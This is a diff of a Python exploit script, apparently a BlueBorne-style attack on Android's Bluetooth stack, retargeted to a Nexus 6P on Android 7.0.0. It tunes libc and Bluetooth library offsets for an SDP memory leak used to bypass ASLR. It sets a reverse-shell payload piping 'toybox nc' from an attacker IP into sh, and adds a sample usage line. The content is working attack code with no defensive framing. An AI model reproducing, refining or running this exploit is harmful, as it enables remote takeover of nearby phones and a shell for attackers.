@@ -27,17 +27,17 @@ STDIN_PORT = 1235
 # 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so
 
 # For Nexus6p 7.0.0 r5
-LIBC_TEXT_STSTEM_OFFSET = 0x45ed0 + 1 # system + 1, why?
+LIBC_TEXT_STSTEM_OFFSET = 0x45ed0 + 1  # system + 1, why?
 BSS_ACL_REMOTE_NAME_OFFSET = 0xc37dc
 
 # For Nexus6p 7.0.0 r5
-LIBC_SOME_BLX_OFFSET = 107521
-BLUETOOTH_BSS_SOME_VAR_OFFSET = -351097 - 0x460
+LIBC_SOME_BLX_OFFSET = 0x1a401 #offset between libc.so : eventfd_write
+BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xcb4b0
 
 MAX_BT_NAME = 0xf5
 
 # Payload details (attacker IP should be accessible over the internet for the victim phone)
-SHELL_SCRIPT = b'toybox nc {ip} {port} | /system/bin/sh'
+SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'
 
 
 PWNING_TIMEOUT = 3
@@ -89,10 +89,10 @@ def memory_leak_get_bases(src, src_hci, dst):
 
     # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
     result = bluedroid.do_sdp_info_leak(dst, src)
-    print result
+    log.info(result)
     # Calculate according to known libc.so and bluetooth.default.so binaries
     likely_some_libc_blx_offset = result[-3][-2]
-    likely_some_bluetooth_default_global_var_offset = result[-1][-4]
+    likely_some_bluetooth_default_global_var_offset = result[-5][-5]
 
     libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
     bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET
@@ -198,4 +198,5 @@ def main(src_hci, dst, my_ip):
 
 
 if __name__ == '__main__':
+    log.info('Usage: python doit.py hci0 98:E7:F5:A2:20:B7 192.168.88.105')
     main(*sys.argv[1:])
